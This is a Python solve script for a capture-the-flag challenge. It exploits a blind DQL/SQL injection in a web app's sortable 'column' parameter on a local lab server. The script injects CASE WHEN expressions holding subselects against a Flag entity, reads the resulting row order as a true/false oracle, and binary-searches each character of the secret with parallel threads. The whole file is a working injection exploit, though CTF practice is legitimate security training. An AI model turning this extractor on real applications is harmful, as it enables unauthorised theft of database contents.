#!/usr/bin/env python3
"""
solve_parallel.py — parallelized dichotomy extractor for the CTF challenge.

Changes vs original:
 - Uses binary search (dichotomy) over sorted ALPHABET to find each character
   (O(log |ALPHABET|) queries per position).
 - Processes multiple positions concurrently using ThreadPoolExecutor with a
   small prefetch window to overlap network latency.
 - Stops at first position that returns "no character" (like your original script).

Configuration:
 - BASE_URL, MAX_LEN, ALPHABET, PREFETCH, WORKERS can be tuned to your env.
"""
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from bs4 import BeautifulSoup
import time
import sys
import threading

# Config
BASE_URL = "http://127.0.0.1:8080/"
TIMEOUT = 8.0
REQUEST_DELAY = 0.002   # per-request sleep (keeps behavior similar to original)
MAX_LEN = 200
# Keep ALPHABET sorted for dichotomy comparisons
ALPHABET = "".join(sorted("CTF{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"))

# Parallelism tuning
WORKERS = 16          # Thread pool size
PREFETCH = 16         # How many positions to keep in-flight (<= WORKERS recommended)

# DQL entity path (escaped as in original)
DQL_FLAG_ENTITY = "App\\Entity\\Flag"

_lock = threading.Lock()

def fetch_first_cell(column_expr: str, direction: str = "DESC") -> str:
    params = {"column": column_expr, "direction": direction}
    r = requests.get(BASE_URL, params=params, timeout=TIMEOUT)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    tbody = soup.find("tbody")
    rows = tbody.find_all("tr") if tbody else soup.find_all("tr")
    if not rows:
        return ""
    first = rows[0] if tbody else (rows[1] if len(rows) > 1 else rows[0])
    cols = first.find_all(["td", "th"])
    if not cols:
        return ""
    return cols[0].get_text(strip=True)

def make_case_expr(condition: str) -> str:
    return f"CASE WHEN {condition} THEN e.cweId ELSE e.name END"

def build_subselect(pos: int) -> str:
    # returns e.g. "(SELECT SUBSTRING(f2.flag, 1, 1) FROM App\\Entity\\Flag f2 WHERE f2.id = 1)"
    return f"(SELECT SUBSTRING(f2.flag, {pos}, 1) FROM {DQL_FLAG_ENTITY} f2 WHERE f2.id = 1)"

class Oracle:
    def __init__(self):
        # will be set by init_baselines()
        self.baseline_true = None
        self.baseline_false = None

    def init_baselines(self):
        # compute once
        self.baseline_true = fetch_first_cell(make_case_expr("1=1"))
        self.baseline_false = fetch_first_cell(make_case_expr("1=2"))
        if self.baseline_true == self.baseline_false:
            print("[-] Warning: baselines identical; oracle may be unreliable.", file=sys.stderr)

    def test_condition(self, condition: str) -> bool:
        """
        Return True if condition is true according to oracle, False if false.
        Raises RuntimeError if response ambiguous.
        """
        expr = make_case_expr(condition)
        val = fetch_first_cell(expr)
        if val == self.baseline_true:
            return True
        if val == self.baseline_false:
            return False
        raise RuntimeError(f"Ambiguous oracle response: got {val!r} (expected one of baselines)")

    def equals_char(self, pos: int, ch: str) -> bool:
        # equality test
        safe = ch.replace("'", "''")
        sub = build_subselect(pos)
        cond = f"{sub} = '{safe}'"
        return self.test_condition(cond)

    def less_than(self, pos: int, ch: str) -> bool:
        # lexicographic less-than test
        # some DBs compare single-character strings lexicographically
        safe = ch.replace("'", "''")
        sub = build_subselect(pos)
        cond = f"{sub} < '{safe}'"
        return self.test_condition(cond)

def binary_search_char(oracle: Oracle, pos: int) -> str | None:
    """
    Binary-search over ALPHABET to find the character at `pos`.
    Returns the character if found, or None if no character at this position (end of flag).
    """
    low = 0
    high = len(ALPHABET) - 1

    # First quick check: is there any character at this position?
    # We check equality against all characters? No — do a cheap check:
    # if SUBSTRING returns empty string, equality tests will all be false.
    # Approach: try equality against middle char; binary search will naturally detect absence if no equality ever matches.
    while low <= high:
        mid = (low + high) // 2
        pivot = ALPHABET[mid]
        # test if character is < pivot
        try:
            lt = oracle.less_than(pos, pivot)
        except Exception as e:
            raise RuntimeError(f"Oracle error during less-than at pos={pos}, pivot={pivot!r}: {e}") from e
        time.sleep(REQUEST_DELAY)

        if lt:
            # actual char is < pivot: search left half
            high = mid - 1
        else:
            # actual char >= pivot
            # check equality with pivot
            try:
                eq = oracle.equals_char(pos, pivot)
            except Exception as e:
                raise RuntimeError(f"Oracle error during equals at pos={pos}, pivot={pivot!r}: {e}") from e
            time.sleep(REQUEST_DELAY)
            if eq:
                return pivot
            # else actual char > pivot, search right half
            low = mid + 1

    # If we exit loop without finding equality, assume no char at this position
    return None

def recover_flag_parallel():
    oracle = Oracle()
    oracle.init_baselines()
    print(f"[+] baseline true  => {oracle.baseline_true!r}")
    print(f"[+] baseline false => {oracle.baseline_false!r}")

    flag_chars = {}
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        # futures mapping pos -> future
        futures = {}
        next_pos_to_submit = 1

        # pre-submit PREFETCH positions
        while next_pos_to_submit <= MAX_LEN and len(futures) < PREFETCH:
            pos = next_pos_to_submit
            futures[pos] = executor.submit(binary_search_char, oracle, pos)
            next_pos_to_submit += 1

        # collect results in order (1..)
        pos = 1
        while pos <= MAX_LEN:
            if pos not in futures:
                # submit next to keep window full
                if next_pos_to_submit <= MAX_LEN:
                    futures[next_pos_to_submit] = executor.submit(binary_search_char, oracle, next_pos_to_submit)
                    next_pos_to_submit += 1
                else:
                    break

            fut = futures[pos]
            try:
                ch = fut.result()   # blocks until this position completed
            except Exception as e:
                print(f"[!] Worker error for pos {pos}: {e}", file=sys.stderr)
                # if a worker fails, stop to be safe
                break

            if ch is None:
                print(f"[*] no matching character at position {pos} -> assuming end of flag")
                break

            flag_chars[pos] = ch
            # print progress
            cur_flag = "".join(flag_chars[i] for i in range(1, pos + 1))
            print(f"[+] pos {pos}: found '{ch}' -> flag so far: {cur_flag!r}")

            # remove future and advance window by submitting next pos
            del futures[pos]
            if next_pos_to_submit <= MAX_LEN:
                futures[next_pos_to_submit] = executor.submit(binary_search_char, oracle, next_pos_to_submit)
                next_pos_to_submit += 1

            pos += 1

    # assemble flag
    flag = "".join(flag_chars[i] for i in sorted(flag_chars.keys()))
    return flag

def main():
    print("[*] starting parallel extraction (binary-search per position)")
    try:
        flag = recover_flag_parallel()
    except requests.RequestException as e:
        print(f"[!] HTTP error: {e}", file=sys.stderr)
        sys.exit(2)
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        sys.exit(3)

    if flag:
        print(f"[+] recovered flag: {flag}")
    else:
        print("[-] no flag recovered")

if __name__ == "__main__":
    main()
